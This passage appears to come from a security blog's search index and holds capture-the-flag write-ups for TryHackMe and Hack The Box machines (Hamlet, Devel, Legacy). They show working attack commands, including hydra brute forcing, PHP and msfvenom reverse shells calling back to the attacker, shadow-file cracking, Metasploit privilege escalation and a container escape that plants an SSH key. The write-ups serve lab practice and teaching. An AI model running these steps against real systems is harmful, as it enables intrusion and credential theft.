.drwxr-xr-x 1 root root 4096 Jan 24 03:18 ..drwxr-xr-x 2 root root 4096 Dec 8 16:04 bindrwxr-xr-x 3 root root 4096 Dec 8 16:03 bootdrwxr-xr-x 4 root root 4096 Dec 8 16:03 devdrwxr-xr-x 94 root root 4096 Dec 13 02:21 etcdrwxr-xr-x 3 root root 4096 Dec 13 01:25 homelrwxrwxrwx 1 root root 34 Dec 8 16:02 initrd.img -&amp;gt; boot/initrd.img-4.15.0-163-genericlrwxrwxrwx 1 root root 34 Dec 8 16:02 initrd.img.old -&amp;gt; boot/initrd.img-4.15.0-163-genericdrwxr-xr-x 20 root root 4096 Dec 13 01:24 libdrwxr-xr-x 2 root root 4096 Dec 8 15:56 lib64drwx------ 2 root root 16384 Dec 8 16:05 lost+founddrwxr-xr-x 2 root root 4096 Dec 8 15:53 mediadrwxr-xr-x 2 root root 4096 Dec 8 15:53 mntdrwxr-xr-x 3 root root 4096 Dec 13 01:25 optdrwxr-xr-x 2 root root 4096 Apr 24 2018 procdrwx------ 6 root root 4096 Jan 24 03:19 rootdrwxr-xr-x 3 root root 4096 Dec 8 16:04 rundrwxr-xr-x 2 root root 4096 Dec 13 01:24 sbindrwxr-xr-x 2 root root 4096 Dec 8 15:53 srvdrwxr-xr-x 2 root root 4096 Apr 24 2018 sysdrwxrwxrwt 8 root root 4096 Jan 24 03:26 tmpdrwxr-xr-x 12 root root 4096 Dec 13 01:25 usrdrwxr-xr-x 12 root root 4096 Dec 13 01:24 varlrwxrwxrwx 1 root root 31 Dec 8 16:02 vmlinuz -&amp;gt; boot/vmlinuz-4.15.0-163-genericlrwxrwxrwx 1 root root 31 Dec 8 16:02 vmlinuz.old -&amp;gt; boot/vmlinuz-4.15.0-163-genericThat is our way out. Let’s get ourself a backdoor (more like, let’s create ourself a key to the frontdoor) :cat &#39;ssh-rsa AAAA[....]=&#39; &amp;gt;&amp;gt; /mnt/host/root/.ssh/authorized_keys$ ssh root@$ip -i ./id_rsaroot@lumberjackturtle:~# iduid=0(root) gid=0(root) groups=0(root)We’re out ! Let’s get our last flag :root@lumberjackturtle:~# cat root.txtPffft. Come on. Look harder.root@lumberjackturtle:~# ls -laR.:total 36[...]/...:total 12drwxr-xr-x 2 root root 4096 Dec 13 01:25 .drwx------ 6 root root 4096 Jan 24 03:19 ..-r-------- 1 root root 26 Dec 13 01:25 ._fLaG2root@lumberjackturtle:~# cat .../._fLaG2 THM{REDACTED}Thanks for reading &amp;lt;3h3x" }, { "title": "Try Hack Me - Hamlet", "url": "/posts/hack-hamlet/", "categories": "tryhackme", "tags": "linux, docker, enumeration, privilege escalation", "date": "2022-01-22 00:00:00 -0500", "snippet": "Challenge descriptionThis one is a medium linux box.Warning: be gentle on brute forcing, enumerating. It doesn’t support much load.https://tryhackme.com/room/hamletReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 -- -A -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[...]PORT STATE SERVICE REASON VERSION21/tcp filtered ftp no-response22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a0:ef:4c:32:28:a6:4c:7f:60:d6:a6:63:32:ac:ab:27 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5/i3O28uWolhittypXr6mAEk+XOV998o/e/3wIWpGq9J1GhtGc3J4uwYpBt7SiS3mZivq9D5jgFhqhHb6zlBsQmGUnXUnQNYyqrBmGnyl4urp5IuV1sRCdNXQdt/lf6Z9A807OPuCkzkAexFUV28eXqdXpRsXXkqgkl5DCm2WEtV7yxPIbGlcmX+arDT9A5kGTZe9rNDdqzSafz0aVKRWoTHGHuqVmq0oPD3Cc3oYfoLu7GTJV+Cy6Hxs3s6oUVcruoi1JYvbxC9whexOr+NSZT9mGxDSDLS6jEMim2DQ+hNhiT49JXcMXhQ2nOYqBXLZF0OYyNKaGdgG35CIT40z| 256 5a:6d:1a:39:97:00:be:c7:10:6e:36:5c:7f:ca:dc:b2 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHtt/3Q8agNKO48Zw3srosCs+bfCx47O+i4tBUX7VGMSpzTJQS3s4DBhGvrvO+d/u9B4e9ZBgWSqo+aDqGsTZxQ=| 256 0b:77:40:b2:cc:30:8d:8e:45:51:fa:12:7c:e2:95:c7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4jv01JeDGsDfhWIJMF8HBv26FI18VLpBeNoiSGbKVp80/tcp open tcpwrapped syn-ack|_http-title: Hamlet Annotation Project| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: lighttpd/1.4.458000/tcp filtered http-alt no-response8080/tcp open http-proxy syn-ack| http-title: WebAnno - Log in |_Requested resource was http://hamlet.thm:8080/login.html|_http-favicon: Spring Java Framework| http-methods: |_ Supported Methods: GET HEAD POST| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 500 | Content-Type: application/json;charset=UTF-8| Date: Sat, 22 Jan 2022 19:13:27 GMT| Connection: close| {&quot;timestamp&quot;:1642878807948,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;exception&quot;:&quot;org.springframework.security.web.firewall.RequestRejectedException&quot;,&quot;message&quot;:&quot;The request was rejected because the URL contained a potentially malicious String &quot;%2e&quot;&quot;,&quot;path&quot;:&quot;/nice%20ports%2C/Tri%6Eity.txt%2ebak&quot;}| GetRequest: | HTTP/1.1 302 | Set-Cookie: JSESSIONID=919602F6E37908EE5B677B07809B78D9; Path=/; HttpOnly| X-Content-Type-Options: nosniff| X-XSS-Protection: 1; mode=block| Cache-Control: no-cache, no-store, max-age=0, must-revalidate| Pragma: no-cache| Expires: 0| X-Frame-Options: SAMEORIGIN| Location: http://localhost:8080/login.html| Content-Length: 0| Date: Sat, 22 Jan 2022 19:13:22 GMT| Connection: close| HTTPOptions: | HTTP/1.1 302 | Set-Cookie: JSESSIONID=7AE9F6DEB1D6B509402799EAE9E4EBEC; Path=/; HttpOnly| X-Content-Type-Options: nosniff| X-XSS-Protection: 1; mode=block| Cache-Control: no-cache, no-store, max-age=0, must-revalidate| Pragma: no-cache| Expires: 0| X-Frame-Options: SAMEORIGIN| Location: http://localhost:8080/login.html| Content-Length: 0| Date: Sat, 22 Jan 2022 19:13:22 GMT| Connection: close| RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Sat, 22 Jan 2022 19:13:26 GMT| Connection: close| &amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;HTTP Status 400 | Request&amp;lt;/title&amp;gt;&amp;lt;style type=&quot;text/css&quot;&amp;gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;HTTP Status 400 |_ Request&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;|_http-open-proxy: Proxy might be redirecting requests1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.92%I=7%D=1/22%Time=61EC5752%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,18F,&quot;HTTP/1\\.1\\x20302\\x20\\r\\nSet-Cookie:\\x20JSESSIONID=919602FSF:6E37908EE5B677B07809B78D9;\\x20Path=/;\\x20HttpOnly\\r\\nX-Content-Type-OptSF:ions:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nCache-ContSF:rol:\\x20no-cache,\\x20no-store,\\x20max-age=0,\\x20must-revalidate\\r\\nPragSF:ma:\\x20no-cache\\r\\nExpires:\\x200\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nLSF:ocation:\\x20http://localhost:8080/login\\.html\\r\\nContent-Length:\\x200\\rSF:\\nDate:\\x20Sat,\\x2022\\x20Jan\\x202022\\x2019:13:22\\x20GMT\\r\\nConnection:\\SF:x20close\\r\\n\\r\\n&quot;)%r(HTTPOptions,18F,&quot;HTTP/1\\.1\\x20302\\x20\\r\\nSet-CookiSF:e:\\x20JSESSIONID=7AE9F6DEB1D6B509402799EAE9E4EBEC;\\x20Path=/;\\x20HttpOnSF:ly\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20SF:mode=block\\r\\nCache-Control:\\x20no-cache,\\x20no-store,\\x20max-age=0,\\x2SF:0must-revalidate\\r\\nPragma:\\x20no-cache\\r\\nExpires:\\x200\\r\\nX-Frame-OptSF:ions:\\x20SAMEORIGIN\\r\\nLocation:\\x20http://localhost:8080/login\\.html\\rSF:\\nContent-Length:\\x200\\r\\nDate:\\x20Sat,\\x2022\\x20Jan\\x202022\\x2019:13:2SF:2\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(RTSPRequest,24E,&quot;HTTP/1\\.1SF:\\x20400\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-LangSF:uage:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Sat,\\x2022\\x20Jan\\x20SF:2022\\x2019:13:26\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&amp;lt;!doctype\\x20htmSF:l&amp;gt;&amp;lt;html\\x20lang=\\&quot;en\\&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\xSF:93\\x20Bad\\x20Request&amp;lt;/title&amp;gt;&amp;lt;style\\x20type=\\&quot;text/css\\&quot;&amp;gt;body\\x20{font-fSF:amily:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:whiSF:te;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{fontSF:-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\SF:x20{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;borSF:der:none;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x9SF:3\\x20Bad\\x20Request&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;)%r(FourOhFourRequest,1A4,&quot;HTTP/SF:1\\.1\\x20500\\x20\\r\\nContent-Type:\\x20application/json;charset=UTF-8\\r\\nDSF:ate:\\x20Sat,\\x2022\\x20Jan\\x202022\\x2019:13:27\\x20GMT\\r\\nConnection:\\x20SF:close\\r\\n\\r\\n{\\&quot;timestamp\\&quot;:1642878807948,\\&quot;status\\&quot;:500,\\&quot;error\\&quot;:\\&quot;InSF:ternal\\x20Server\\x20Error\\&quot;,\\&quot;exception\\&quot;:\\&quot;org\\.springframework\\.securSF:ity\\.web\\.firewall\\.RequestRejectedException\\&quot;,\\&quot;message\\&quot;:\\&quot;The\\x20reqSF:uest\\x20was\\x20rejected\\x20because\\x20the\\x20URL\\x20contained\\x20a\\x20pSF:otentially\\x20malicious\\x20String\\x20\\\\\\&quot;%2e\\\\\\&quot;\\&quot;,\\&quot;path\\&quot;:\\&quot;/nice%20pSF:orts%2C/Tri%6Eity\\.txt%2ebak\\&quot;}&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelLet’s see what we got here: OpenSSH 7.6p1 running on port 22 vsFTPd 3.0.3 running on port 21 lighttpd/1.4.45 running on port 80 Some web application named WebAnno running on port 8080 Apache/2.4.48 running on port 8000 Some unknown service running on port 501FTP EnumerationWe can log on anonymously on the FTP serverWe get access to two files: ufw.statusStatus: activeTo Action From-- ------ ----20/tcp ALLOW Anywhere 21/tcp ALLOW Anywhere 22/tcp ALLOW Anywhere 80/tcp ALLOW Anywhere 501/tcp ALLOW Anywhere 8080/tcp ALLOW Anywhere 8000/tcp ALLOW Anywhere 1603/tcp ALLOW Anywhere 1564/tcp ALLOW Anywhere 50000:50999/tcp ALLOW Anywhere 20/tcp (v6) ALLOW Anywhere (v6) 21/tcp (v6) ALLOW Anywhere (v6) 22/tcp (v6) ALLOW Anywhere (v6) 80/tcp (v6) ALLOW Anywhere (v6) 501/tcp (v6) ALLOW Anywhere (v6) 8080/tcp (v6) ALLOW Anywhere (v6) 8000/tcp (v6) ALLOW Anywhere (v6) 1603/tcp (v6) ALLOW Anywhere (v6) 1564/tcp (v6) ALLOW Anywhere (v6) 50000:50999/tcp (v6) ALLOW Anywhere (v6)Looks like there’s a firewall active on the target and we have the list of open ports. Let’s keep that in mind and keep going. password-policy.md# Password Policy## WebAnnoNew passwords should be:- lowercase- between 12 and 14 characters longPort 501I’ll be honest here, I didn’t do this one. I looked at the official walkthrough. Here’s the solution to the second flag anyway :$ nc 10.10.245.164 501GRAVEDIGGERWhat do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?PENTESTERThe one who builds the gallows to hang people on, since his structure outlives a thousand inhabitants.THM{2_redacted}Web EnumerationPort 80 index.html robots.txtUser-agent: *Allow: /THM{1_redacted}Aaand we got the first flagPort 8000 index.htmlThe home page shows a text file inside an iframe. Source shows us the URI to the file :http://hamlet.thm:8000/repository/project/0/document/0/source/hamlet.txtPort 8080This one is the actual WebAnno application. We first get to a login page. We’ll get back to it later.Michael’s passwordTo answer the task 1 we must get “Michael’s password”. From http://hamlet.thm/index.html. We know that Michael’s username is ghost and that he’s obsessed with Hamlet and the vocabulary used by Shakespeare.We also know the password policy for WebAnno from the file we got from the FTP server. With that in hands, let’s build a custom wordlist to bruteforce Michael’s password.$ cewl --lowercase -m 12 -d 1 http://hamlet.thm | grep -E &#39;.{,14}&#39; &amp;gt; password.txt$ hydra -l ghost -P ./password.txt hamlet.thm -s 8080 http-post-form &quot;/login.html?-1.-loginForm:urlfragment=&amp;amp;username=^USER^&amp;amp;password=^PASS^:F=failed&quot;Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service[...][8080][http-post-form] host: hamlet.thm login: ghost password: (redacted)We have the answer to task 1 and we can now login to WebAnno to begin exploring it.Third flag &amp;amp;&amp;amp; Fourth flag &amp;amp;&amp;amp; FootholdWebAnno explorationStart by looking at the users list. We can see that we have admin privileges as ghost. There is another user named ophelia. Let’s abuse our privileges to change ophelia’s password and log into her account.In the annotations section, open hamlet.txt and look at the annotations ophelia has createdThis is ophelia’s password for FTPAuthenticated FTP enumeration$ ftp 10.10.245.164Connected to 10.10.245.164.220 (vsFTPd 3.0.3)Name (10.10.245.164:h3x): ophelia331 Please specify the password.Password: 230 Login successful.ftp&amp;gt; ls-rw-r--r-- 1 1001 1001 31 Sep 16 06:19 flagftp&amp;gt; get flag flag3local: flag3 remote: flag100% |************************************************************| 31 308.91 KiB/s 00:00 ETA226 Transfer complete.31 bytes received in 00:00 (0.10 KiB/s)ftp&amp;gt; exit# 3rd flag !$ cat flag3THM{3_redacted}We can also get the 4th flag from the FTP :ftp&amp;gt; ls /optdrwx--x--x 4 0 0 4096 Sep 15 11:39 containerddrwxr-xr-x 2 0 0 4096 Sep 15 14:46 stagedrwxr-xr-x 2 0 0 4096 Sep 15 14:46 webftp&amp;gt; ls /opt/stage-rw-r--r-- 1 0 0 29 Sep 16 06:19 flagftp&amp;gt; cd /opt/stageftp&amp;gt; ls-rw-r--r-- 1 0 0 29 Sep 16 06:19 flagftp&amp;gt; get flag flag4local: flag4 remote: flag100% |************************************************************| 29 283.20 KiB/s 00:00 ETA226 Transfer complete.29 bytes received in 00:00 (0.08 KiB/s)ftp&amp;gt; exit# 4th flag !$ cat flag4THM{4_redacted}Next, we’re gonna explore the projects. There’s a Documents tab in which we can upload files. There are no restriction on the type of files we are able to upload. Let’s upload a PHP Reverse Shell. I used this oneNow we have to execute our shell. Remember that iframe with a text file inside ? This is the key to find where our shell has been uploaded.$ nc -lnvp 4444 listening on [any] 4444 ...$ curl http://hamlet.thm:8000/repository/project/0/document/1/source/shell.phpconnect to [1.1.1.1] from (UNKNOWN) [10.10.245.164] 37388SOCKET: Shell has connected! PID: 23ls -la /total 88drwxr-xr-x 1 root root 4096 Sep 15 14:47 .drwxr-xr-x 1 root root 4096 Sep 15 14:47 ..-rwxr-xr-x 1 root root 0 Sep 15 14:47 .dockerenvWe have a foothold on the target as www-data and we’re inside a container.Privilege EscalationAfter checking the basic privilege escalation vectors, we can see that /bin/cat has the setuid bit :find / -perm /4000 2&amp;gt;/dev/null/bin/umount/bin/mount/bin/cat/bin/su/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/chshLet’s abuse this to get the root password :# on targetcat /etc/shadowroot:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::[...]cat /etc/passwdroot:x:0:0:root:/root:/bin/bash[...]# on our machine$ echo &#39;root:$y$j9T$.9s2wZRY3[...]q7a4xAD0k9jw2m4:18885:0:99999:7:::&#39; &amp;gt; shadow$ echo &#39;root:x:0:0:root:/root:/bin/bash&#39; &amp;gt; passwd$ unshadow ./passwd ./shadow &amp;gt; unshadowed$ john --wordlist=/opt/wordlists/rockyou.txt ./unshadowed --format=cryptUsing default input encoding: UTF-8Loaded 1 password hash (crypt, generic crypt(3) [?/64])Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashesCost 2 (algorithm specific iterations) is 1 for all loaded hashesWill run 8 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status(REDACTED) (root) 1g 0:00:00:17 DONE (2022-01-24 13:37) 0.05611g/s 274.7p/s 274.7c/s 274.7C/s yessica..FUCKYOUUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed.# back on targetsu Password: (redacted)iduid=0(root) gid=0(root) groups=0(root)# while we are here, let&#39;s get the 5th flagcd /rootls -latotal 20drwx------ 1 root root 4096 Sep 15 14:47 .drwxr-xr-x 1 root root 4096 Sep 15 14:47 ..-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc-rw-r--r-- 1 root root 24 Sep 16 06:20 .flag-rw-r--r-- 1 root root 161 Jul 9 2019 .profilecat .flagTHM{5_redacted}Container escapeStart by listing disks:ls -la /dev | grep diskcrw-rw---- 1 root disk 10, 234 Jan 24 13:25 btrfs-controlbrw-rw---- 1 root disk 253, 0 Jan 24 13:25 dm-0crw-rw---- 1 root disk 10, 237 Jan 24 13:25 loop-control[...]Mount /dev/dm-0 to see what’s insidemkdir /mnt/hostmount /dev/dm-0 /mnt/hostls -l /mnt/hosttotal 4015216drwxr-xr-x 2 root root 4096 Sep 15 11:24 bindrwxr-xr-x 2 root root 4096 Sep 15 11:14 bootdrwxr-xr-x 2 root root 4096 Sep 15 11:15 cdromdrwxr-xr-x 4 root root 4096 Aug 6 2020 devdrwxr-xr-x 99 root root 4096 Sep 16 06:43 etcdrwxr-xr-x 5 root root 4096 Sep 15 14:41 homelrwxrwxrwx 1 root root 34 Sep 15 11:16 initrd.img -&amp;gt; boot/initrd.img-4.15.0-156-genericlrwxrwxrwx 1 root root 34 Sep 15 11:16 initrd.img.old -&amp;gt; boot/initrd.img-4.15.0-156-genericdrwxr-xr-x 23 root root 4096 Sep 15 11:39 libdrwxr-xr-x 2 root root 4096 Aug 6 2020 lib64drwx------ 2 root root 16384 Sep 15 11:14 lost+founddrwxr-xr-x 2 root root 4096 Aug 6 2020 mediadrwxr-xr-x 3 root root 4096 Sep 15 14:43 mntdrwxr-xr-x 5 root root 4096 Sep 15 14:46 optdrwxr-xr-x 2 root root 4096 Apr 24 2018 procdrwx------ 5 root root 4096 Sep 15 14:49 rootdrwxr-xr-x 13 root root 4096 Aug 6 2020 rundrwxr-xr-x 2 root root 12288 Sep 15 11:39 sbindrwxr-xr-x 2 root root 4096 Sep 15 11:31 snapdrwxr-xr-x 4 root root 4096 Sep 15 14:45 srv-rw------- 1 root root 4111466496 Sep 15 11:16 swap.imgdrwxr-xr-x 2 root root 4096 Apr 24 2018 sysdrwxrwxrwt 9 root root 4096 Jan 24 13:28 tmpdrwxr-xr-x 10 root root 4096 Aug 6 2020 usrdrwxr-xr-x 14 root root 4096 Sep 15 14:42 varlrwxrwxrwx 1 root root 31 Sep 15 11:16 vmlinuz -&amp;gt; boot/vmlinuz-4.15.0-156-genericlrwxrwxrwx 1 root root 31 Sep 15 11:16 vmlinuz.old -&amp;gt; boot/vmlinuz-4.15.0-156-genericNow all we have to do is to add a public key to the root’s authorized_keys :echo &#39;ssh-rsa AAAA[....]=&#39; &amp;gt;&amp;gt; /mnt/host/root/.ssh/authorized_keys$ ssh root@$ip -i ./id_rsaroot@hamlet:~# id &amp;amp;&amp;amp; hostnameuid=0(root) gid=0(root) groups=0(root)hamletroot@hamlet:~# cat /root/flagTHM{6_redacted}Thanks for reading &amp;lt;3h3x" }, { "title": "Hack The Box - Devel", "url": "/posts/htb-devel/", "categories": "hackthebox", "tags": "windows", "date": "2022-01-18 00:00:00 -0500", "snippet": "Challenge descriptionhttps://app.hackthebox.com/machines/DevelThis VM is an easy Windows machineReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC -Pn[...]PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack Microsoft ftpd| ftp-syst: |_ SYST: Windows_NT| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 03-18-17 01:06AM &amp;lt;DIR&amp;gt; aspnet_client| 03-17-17 04:37PM 689 iisstart.htm|_03-17-17 04:37PM 184946 welcome.png80/tcp open http syn-ack Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-title: IIS7Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWe have an IIS 7.5 FTP and Web serverWeb EnumerationThere’s not much here to discover. The site is an IIS default web page.FTP EnumerationFTP server is accessible anonymously. Even better, this FTP server is giving us write permissions on the site root folder.Exploitation &amp;amp;&amp;amp; FootholdLet’s create a meterpreter payload as an aspx file and upload it$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx &amp;gt; h3xshell.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of aspx file: 2713 bytes$ ftp $ipConnected to 10.10.10.5.220 Microsoft FTP ServiceName (10.10.10.5:h3x): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; put h3xshell.aspxlocal: h3xshell.aspx remote: h3xshell.aspx229 Entering Extended Passive Mode (|||49211|)150 Opening ASCII mode data connection.100% |****************************************************************************************************************| 2748 23.60 MiB/s --:-- ETA226 Transfer complete.2748 bytes sent in 00:00 (143.79 KiB/s)Now that our payload is in place, launch a metasploit handler, browse the payload and wait for the shell:$ msfconsolemsf6 &amp;gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set rhosts 10.10.10.5rhosts =&amp;gt; 10.10.10.5msf6 exploit(multi/handler) &amp;gt; set lhost tun0lhost =&amp;gt; tun0msf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcppayload =&amp;gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.5:4444 [*] Sending stage (175174 bytes) to 10.10.10.5Meterpreter session 1 opened (10.10.14.5:4444 -&amp;gt; 10.10.10.5:49277 ) at 2022-01-19 04:11:20 +0000meterpreter &amp;gt; shellProcess 516 created.Channel 1 created.Microsoft Windows [Version 6.1.7600]Copyright (c) 2009 Microsoft Corporation. All rights reserved.c:\\windows\\system32\\inetsrv&amp;gt;whoamiwhoamiiis apppool\\webPrivilege EscalationThere are 2 services vulnerable to a registry edit attack. Dnscache and RpcEptMapper. There is a way to create a performance counter pointing to a malicious DLL.The exploit is well described hereThere’s a metasploit module that we can use to exploit the service: exploit/windows/local/service_permissionsmeterpreter &amp;gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &amp;gt; use exploit/windows/local/service_permissions[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/service_permissions) &amp;gt; set session 1session =&amp;gt; 1msf6 exploit(windows/local/service_permissions) &amp;gt; set lhost tun0lhost =&amp;gt; tun0msf6 exploit(windows/local/service_permissions) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.5:4444[*] Trying to add a new service...[*] Trying to find weak permissions in existing services..[+] [Dnscache] Created registry key: HKLM\\System\\CurrentControlSet\\Services\\Dnscache\\Performance[*] Sending stage (175174 bytes) to 10.10.10.5[*] Meterpreter session 4 opened (10.10.14.5:4444 -&amp;gt; 10.10.10.5:49271 ) at 2022-01-19 02:02:05 +0000meterpreter &amp;gt; shellProcess 728 created.Channel 2 created.Microsoft Windows [Version 6.1.7600]Copyright (c) 2009 Microsoft Corporation. All rights reserved.e69af0e4f443de7e36876fda4ec7644fC:\\Windows\\system32&amp;gt;whoamiwhoamint authority\\systemc:\\Users\\babis\\Desktop&amp;gt;more user.txt.txtmore user.txt.txt(redacted)C:\\Windows\\system32&amp;gt;more e69af0e4f443de7e36876fda4ec7644fc:\\users\\administrator\\desktop\\root.txtmore c:\\users\\administrator\\desktop\\root.txt(redacted)Thanks for reading &amp;lt;3h3x" }, { "title": "Hack The Box - Legacy", "url": "/posts/htb-legacy/", "categories": "hackthebox", "tags": "cve, windows, smb, eternalblue", "date": "2022-01-17 00:00:00 -0500", "snippet": "Challenge descriptionhttps://app.hackthebox.com/machines/LegacyThis VM is an easy Windows machineReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC -Pn[...]PORT STATE SERVICE REASON VERSION139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack Windows XP microsoft-dsService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_smb2-security-mode: Couldn&#39;t establish a SMBv2 connection.| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 40600/tcp): CLEAN (Timeout)| Check 2 (port 23309/tcp): CLEAN (Timeout)| Check 3 (port 50902/udp): CLEAN (Timeout)| Check 4 (port 25473/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_smb2-time: Protocol negotiation failed (SMB2)|_clock-skew: mean: 5d01h12m40s, deviation: 1h24m51s, median: 5d00h12m40s| nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:59:18 (VMware)| Names:| LEGACY&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| HTB&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| LEGACY&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| HTB&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| HTB&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 50 56 b9 59 18 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb-security-mode: | account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager)| OS CPE: cpe:/o:microsoft:windows_xp::-| Computer name: legacy| NetBIOS computer name: LEGACY\\x00| Workgroup: HTB\\x00|_ System time: 2022-01-23T08:29:53+02:00SMB Enumeration$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip -PnHost script results:| smb-enum-shares: | note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)| account_used: &amp;lt;blank&amp;gt;| \\\\10.10.10.4\\ADMIN$: | warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED| Anonymous access: &amp;lt;none&amp;gt;| \\\\10.10.10.4\\C$: | warning: 